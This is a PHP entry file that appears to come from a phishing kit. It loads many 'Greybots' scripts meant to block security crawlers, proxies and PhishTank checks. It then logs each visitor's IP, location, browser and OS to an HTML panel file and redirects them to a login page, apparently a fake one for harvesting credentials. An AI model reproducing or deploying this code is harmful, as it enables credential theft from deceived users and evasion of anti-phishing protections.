<?php 

	ob_start();
	session_start();

	include "../Greybots/Bad_ip.php";
	include "../Greybots/Grey-Bot-1.php";
	include "../Greybots/Grey-Bot-2.php";
	include "../Greybots/Grey-Bot-3.php";
	include "../Greybots/Grey-Bot-4.php";
	include "../Greybots/Grey-Bot-5.php";
	include "../Greybots/Grey-Bot-6.php";
	include "../Greybots/Grey-Bot-7.php";
	include "../Greybots/Grey-Bot-8.php";
	include "../Greybots/Grey-Bot-9.php";
	include "../Greybots/Grey-Bot-10.php";
	include "../Greybots/Grey-Bot-11.php";
	include "../Greybots/Grey-Bot-12.php";
	include "../Greybots/Grey-Bot-Crawler.php";
	include "../Greybots/Grey-IP-BlackList.php";
	include "../Greybots/Grey-Phishingtank.php";
	include "../Greybots/Grey-antibot-phishtank.php";
	include "../Greybots/Grey-Proxyblock.php";
	include "../Greybots/Grey-userAgent-1.php";
	include "../Greybots/Grey-antibot-host.php";
	include "../Greybots/Grey-antibot-ip.php";
	include "../Greybots/Grey-antibot-proxy.php";
	include "../Greybots/Grey-Blocker.php";
	include "../Greybots/Grey-Bot.php";

	require 'system/detect.php';
	if(isset($_GET['lang'])){
	$_SESSION['language']=$_GET['lang'];}
	else{
	$_SESSION['language']=getLanguage();}
	$_SESSION['ip']=clientData('ip');
	$_SESSION['ip_countryName']=clientData('country');
	$_SESSION['ip_countryCode']=clientData('code');
	$_SESSION['ip_city']=clientData('city');
	$_SESSION['ip_state']=clientData('state');
	$_SESSION['ip_timezone']=clientData('timezone');
	$_SESSION['currency']=clientData('currency');
	$_SESSION['os']=getOs();
	$_SESSION['browser']=getBrowser();date_default_timezone_set('GMT');
	$dateNow=date("d/m/Y H:i:s A");
	
$code = '<tr>
<td width="80"><p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">  '.$_SESSION['ip'].'</th>
<td width="80"><p align="center">'.$_SESSION['browser'].'</th>
<td width="80"><p align="center">'.$_SESSION['os'].'</th>
<td width="80"><p align="center">'.$_SESSION['ip_countryCode'].'</th>
<td width="80"><p align="center">'.$dateNow.'</th></th>
</tr>';

$save=fopen("panel/vis".$namerand.".html", "a+");
fwrite($save,$code);fclose($save);
	exit(header("Location: login.php"));
?>